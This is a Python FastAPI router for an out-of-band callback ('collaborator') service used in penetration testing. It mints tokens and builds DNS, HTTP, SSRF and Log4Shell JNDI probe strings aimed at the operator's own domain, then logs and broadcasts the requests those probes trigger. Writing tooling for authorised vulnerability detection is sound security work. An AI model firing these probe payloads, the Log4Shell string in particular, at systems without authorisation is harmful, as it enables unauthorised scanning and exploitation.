import secrets
import json
from datetime import datetime, timezone
from fastapi import APIRouter, Depends, Request, Query
from sqlalchemy import select, desc, and_
from sqlalchemy.ext.asyncio import AsyncSession
from api.deps import get_db
from core.storage.models import CollaboratorInteraction, InteractionTypeEnum
from core.events.schemas import CollaboratorHitEvent
from core.config import settings
from pydantic import BaseModel

router = APIRouter(prefix="/api/collaborator", tags=["collaborator"])


class CollaboratorWebhookPayload(BaseModel):
    token: str
    type: str
    source_ip: str
    raw: str | None = None


class TokenResponse(BaseModel):
    token: str
    subdomain: str
    dns_payload: str
    http_payload: str
    log4shell_payload: str
    ssrf_payload: str
    api_callback_url: str


class InteractionResponse(BaseModel):
    id: str
    token: str
    interaction_type: str
    source_ip: str
    received_at: str
    raw_payload: str | None = None
    method: str | None = None
    url: str | None = None

    model_config = {"from_attributes": True}

    @classmethod
    def from_orm(cls, obj):
        return cls(
            id=str(obj.id),
            token=obj.token,
            interaction_type=str(obj.interaction_type.value) if hasattr(obj.interaction_type, 'value') else str(obj.interaction_type),
            source_ip=obj.source_ip,
            received_at=obj.received_at.isoformat() if obj.received_at else "",
            raw_payload=obj.raw_payload,
            method=obj.method,
            url=obj.url,
        )


def _broadcast_collaborator_hit(request: Request, token: str, interaction_type: str, source_ip: str):
    ws_manager = getattr(request.app.state, "ws_manager", None)
    if ws_manager and hasattr(ws_manager, "_broadcast"):
        import asyncio
        coro = ws_manager._broadcast(CollaboratorHitEvent(
            token=token,
            interaction_type=interaction_type,
            source_ip=source_ip,
        ))
        if asyncio.iscoroutine(coro):
            loop = asyncio.get_event_loop()
            if loop.is_running():
                try:
                    asyncio.create_task(coro)
                except RuntimeError:
                    pass
            else:
                loop.run_until_complete(coro)
        elif callable(coro):
            coro()


@router.post("/interactions", include_in_schema=False)
async def receive_interaction(
    request: Request,
    payload: CollaboratorWebhookPayload,
    db: AsyncSession = Depends(get_db),
):
    interaction = CollaboratorInteraction(
        token=payload.token,
        interaction_type=payload.type,
        source_ip=payload.source_ip,
        raw_payload=payload.raw,
    )
    db.add(interaction)
    await db.commit()
    await db.refresh(interaction)
    _broadcast_collaborator_hit(request, payload.token, payload.type, payload.source_ip)
    return {"status": "ok", "id": str(interaction.id)}


@router.api_route("/callback/{token:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"], include_in_schema=False)
async def collaborator_callback(
    token: str,
    request: Request,
    db: AsyncSession = Depends(get_db),
):
    body_bytes = await request.body()
    body_str = body_bytes.decode("utf-8", errors="replace") if body_bytes else None
    headers = dict(request.headers)
    source_ip = request.client.host if request.client else "unknown"
    ua = headers.get("user-agent", "")

    interaction = CollaboratorInteraction(
        token=token,
        interaction_type=InteractionTypeEnum.HTTP,
        source_ip=source_ip,
        raw_payload=body_str[:10000] if body_str else "",
        method=request.method,
        url=str(request.url),
        request_headers=headers,
        body=body_str[:50000] if body_str else None,
        user_agent=ua,
    )
    db.add(interaction)
    await db.commit()
    await db.refresh(interaction)
    _broadcast_collaborator_hit(request, token, "http", source_ip)
    return {"status": "ok", "id": str(interaction.id)}


@router.get("/generate-token", response_model=TokenResponse)
async def generate_token():
    token = secrets.token_hex(8)
    domain = settings.COLLABORATOR_DOMAIN
    subdomain = f"{token}.{domain}"
    callback_url = settings.COLLABORATOR_URL.rstrip("/") + f"/api/collaborator/callback/{token}"
    return TokenResponse(
        token=token,
        subdomain=subdomain,
        dns_payload=subdomain,
        http_payload=f"http://{subdomain}/",
        log4shell_payload=f"${{jndi:ldap://{subdomain}/a}}",
        ssrf_payload=f"http://{subdomain}/",
        api_callback_url=callback_url,
    )


@router.get("/interactions", response_model=list[InteractionResponse])
async def list_interactions(
    token: str | None = Query(None),
    since: str | None = Query(None),
    db: AsyncSession = Depends(get_db),
):
    stmt = select(CollaboratorInteraction).order_by(desc(CollaboratorInteraction.received_at))
    filters = []
    if token:
        filters.append(CollaboratorInteraction.token == token)
    if since:
        try:
            since_dt = datetime.fromisoformat(since)
            if since_dt.tzinfo is None:
                since_dt = since_dt.replace(tzinfo=timezone.utc)
            filters.append(CollaboratorInteraction.received_at > since_dt)
        except ValueError:
            pass
    if filters:
        stmt = stmt.where(and_(*filters))
    result = await db.execute(stmt)
    return [InteractionResponse.from_orm(row) for row in result.scalars().all()]


@router.get("/health")
async def collaborator_health():
    return {"status": "ok", "service": "collaborator", "mode": "embedded"}
